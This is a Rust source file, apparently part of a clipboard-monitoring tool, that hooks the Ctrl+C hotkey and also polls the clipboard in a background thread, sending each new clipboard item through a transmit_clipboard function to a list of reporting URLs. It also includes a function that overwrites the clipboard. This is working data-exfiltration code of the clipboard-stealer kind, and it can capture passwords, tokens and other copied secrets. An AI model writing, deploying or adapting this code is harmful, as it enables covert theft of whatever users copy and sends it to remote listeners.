use copypasta::{ClipboardContext, ClipboardProvider};
use mki::Keyboard;
use std::{thread, time::Duration};

use crate::transmitter::transmit_clipboard;

pub fn register_clipboard_hook(wait_time: Duration, reporting_urls: Vec<String>) {
    println!("Sending clipboard contents to: {:?}", reporting_urls);

    let copied_urls = reporting_urls.clone();

    mki::register_hotkey(&[Keyboard::LeftControl, Keyboard::C], move || {
        //Wait until the system has copied the text to the clipboard
        thread::sleep(Duration::from_millis(64));

        match read_clipboard() {
            Ok(content) => {
                //Send the clipboard contents to the listeners
                transmit_clipboard(content, &reporting_urls);
            }
            Err(e) => {
                println!("{}", e);
            }
        }
    });

    let mut old_clipboard_contents = read_clipboard().unwrap_or(".".into());

    thread::spawn(move || loop {
        match read_clipboard() {
            Ok(content) => {
                if content != old_clipboard_contents {
                    old_clipboard_contents = content.clone();
                    transmit_clipboard(content, &copied_urls);
                }
            }
            Err(e) => {
                println!("{}", e);
            }
        }

        thread::sleep(wait_time);
    });
}

// Extract the clipboard contents
pub fn read_clipboard() -> Result<String, &'static str> {
    let mut ctx = ClipboardContext::new().unwrap();

    match ctx.get_contents() {
        Ok(contents) => Ok(contents),
        Err(_) => Err("Failed to read clipboard contents"),
    }
}

// Update the clipboard contents
pub fn write_clipboard(text: String) {
    let mut ctx = ClipboardContext::new().unwrap();
    ctx.set_contents(text).unwrap();
}
